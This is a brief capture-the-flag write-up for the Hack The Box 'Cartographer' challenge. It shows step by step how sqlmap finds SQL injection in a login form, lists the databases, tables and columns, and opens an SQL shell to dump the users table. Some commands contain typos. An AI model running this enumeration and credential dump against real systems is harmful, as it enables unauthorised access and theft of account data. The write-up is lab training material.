# Cartographer
Solution to Hack The Box Challenge - Cartographer

### Problem

It's a web that exposes you a login form and you must discover the username and password to gain access.

### Solution

SQL Injection using SQLMap
[SQLMap - automatic SQL injection](http://sqlmap.org/)

Tell SQLMap to detect vulnerabilites sending a payload example (extracted from the form)
```bash
sqlmap -u http://docker.hackthebox.eu:31837/ --data="username=asd&password=asd"
```

SQL detect a vulnerability that you can exploit. So you tell it to list all the dbs
```bash
sqlmap -u http://docker.hackthebox.eu:31837/ --data="username=asd&password=asd" --dbs
```

It has the dbs. So list the tables
```bash
sqlmap -u http://docker.hackthebox.eu:31837/ --data="username=asd&password=asd" --tables -D cartographer
```

It has the tables. So list the columns of the table that I was interested.
```bash
sqlmap -u http://docker.hackthebox.eu:31837/ --data="username=asd&password=asd" --colums -T users -D cartographer
```

It has all the info. So I want to use a sql query to consume it. SQLMap can give me access to a SQL console using this command
```bash
sqlmap -u http://docker.hackthebox.eu:31837/ --data="username=asd&password=asd" ---D cartographer --sql-shell
```

Send a query to get the accounts.
```bash
sql-shell> SELECT * FROM cartographer.users
```
